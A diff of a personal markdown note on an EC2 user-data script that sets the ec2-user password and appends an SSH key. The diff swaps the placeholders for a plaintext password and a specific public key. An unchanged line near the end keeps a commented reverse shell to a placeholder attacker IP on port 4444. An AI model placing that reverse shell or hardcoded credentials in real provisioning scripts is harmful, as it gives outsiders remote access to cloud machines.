@@ -1,12 +1,12 @@
 # user-data
 
-**Author:** Julien Bongars\
+**Author:** Julien Bongars  
 **Date:** 2025-12-22 21:38:26
 **Path:**
 
 ---
 
-EC2 user-data multipart: set `ec2-user` password and drop an SSH key.
+**Change Password for EC2-instance**
 
 ```shell
 Content-Type: multipart/mixed; boundary="//"
@@ -32,10 +32,10 @@ Content-Disposition: attachment; filename="userdata.txt"
 # your script goes here....
 
 # change password for ec2-user
-echo 'ec2-user:<password>' | chpasswd
+echo 'ec2-user:migraine-buddy-user-1123' | chpasswd
 
 # add ssh public key
-echo 'ssh-ed25519 <YOUR_SSH_PUBLIC_KEY> julien' >> /home/ec2-user/.ssh/authorized_keys
+echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM0M0hjLvNVV8KKu4Ko6bZbnafwgcf7vmM/GQe3VHbiW julien' >> /home/ec2-user/.ssh/authorized_keys
 
 # install SSM manager
 # source: https://docs.aws.amazon.com/systems-manager/latest/userguide/agent-install-rhel-8-9.html
@@ -46,8 +46,3 @@ echo 'ssh-ed25519 <YOUR_SSH_PUBLIC_KEY> julien' >> /home/ec2-user/.ssh/authorize
 # bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
 --//--
 ```
-
-## Resources
-
-- [AWS — user data](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html) — cloud-init / shell
-- [SSM Agent on RHEL](https://docs.aws.amazon.com/systems-manager/latest/userguide/agent-install-rhel-8-9.html) — the commented install above
